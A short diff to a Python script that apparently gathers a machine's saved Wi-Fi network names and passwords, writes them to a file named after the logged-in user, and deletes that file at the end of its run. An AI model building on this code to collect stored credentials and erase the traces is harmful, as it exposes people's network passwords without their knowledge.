@@ -39,12 +39,14 @@ def zipping_ssid_password(file):
 
 def make_doc(zip_file):
     path = os.getcwd()
+    username =  os.getlogin()
+    filename = "wi_fi_password_"+username+".txt"
     for file in os.listdir(path):
         if file.startswith("wi_fi_password") and file.endswith(".txt"):
             os.remove(path+"\\"+file)
     
     for id,pwd in zip_file:
-        with open("wi_fi_password.txt","a") as doc:
+        with open(filename,"a") as doc:
             doc.write(f"SSID: {id} --------------- Password: {pwd}\n")
     
     return doc.name
@@ -113,5 +115,3 @@ def execute():
     delete_files(path)
     # finnaly removing document 
     os.remove(document)
-
-    
